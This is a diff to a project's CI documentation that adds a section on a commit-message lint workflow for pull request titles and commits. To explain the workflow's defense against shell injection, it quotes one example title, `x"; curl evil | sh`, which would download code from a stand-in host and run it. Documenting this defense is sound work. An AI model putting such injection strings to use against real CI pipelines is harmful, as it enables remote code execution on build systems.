@@ -7,6 +7,7 @@ are free for public repositories, macOS included). The rest is listed in [What n
 |---|---|---|
 | `ci.yml` | every pull request and push to `main`; `workflow_dispatch` | `check`, `deny`, `lab-scripts`, `packaging` |
 | `ci.yml` | pushes to `main` and manual runs only | `gui-smoke` (macOS 15 and 26), `x86-64` (macOS 15 Intel), `bundle` |
+| `commit-lint.yml` | every pull request (opened, edited, synchronize, reopened) | `commit-lint`, `hooks-tests` |
 | `nightly.yml` | every night 02:41 UTC; `workflow_dispatch` | `checklist` (macOS 15 and 26), `soak` (macOS 15) |
 | `advisories.yml` | Mondays 06:17 UTC; `workflow_dispatch` | RustSec advisories for the locked dependencies |
 | `release.yml` | a pushed `v*` tag; `workflow_dispatch` builds and uploads but never creates a release | signed or ad-hoc universal build, draft release |
@@ -44,6 +45,20 @@ Required status checks on `main`: `check` and `deny`.
 
 Logs, results and screenshots are uploaded as artifacts **only when a job fails** (7 days). Screenshots of green runs are deleted before the
 job ends. The job summary page of every run has the report (smoke stages, checklist rows that are not PASS, soak samples).
+
+## Commit messages: `commit-lint.yml`
+
+Pull requests are squash-merged, so the pull request title becomes the commit on `main` and the release version is computed from it
+([RELEASING.md](RELEASING.md)). The `commit-lint` job (ubuntu, about 10 s) runs `scripts/commit-lint.sh` twice: on the **title**
+(`--title`) and on **every commit of the pull request** (`--range refs/remotes/origin/<base>..<head sha>`, `fetch-depth: 0`; merge commits are skipped),
+both with `--forbid-names`. The rules are in [CONTRIBUTING.md](../CONTRIBUTING.md#commit-messages-and-pull-requests); they run locally as
+git hooks too, and CI repeats them because hooks can be skipped. The title, the base branch and the head SHA reach the shell only through
+environment variables, never through `${{ }}` in a command line (a title like `x"; curl evil | sh` is just text). Editing the title re-runs
+the job (`edited`). Dependabot pull requests get a header limit of 120 instead of 72 (its group titles are longer and cannot be shortened).
+The second job, `hooks-tests`, runs `tests/hooks/run-tests.sh` (the validator and the hooks, in throw-away repositories) on Linux, which keeps the
+scripts portable; on macOS the same tests run inside `scripts/check.sh`. Reproduce locally: `scripts/commit-lint.sh --title "..."`,
+`scripts/commit-lint.sh --range origin/main..HEAD`, `tests/hooks/run-tests.sh`. `commit-lint` is not a required status check until a
+maintainer adds it to the ruleset.
 
 ## Pins
 
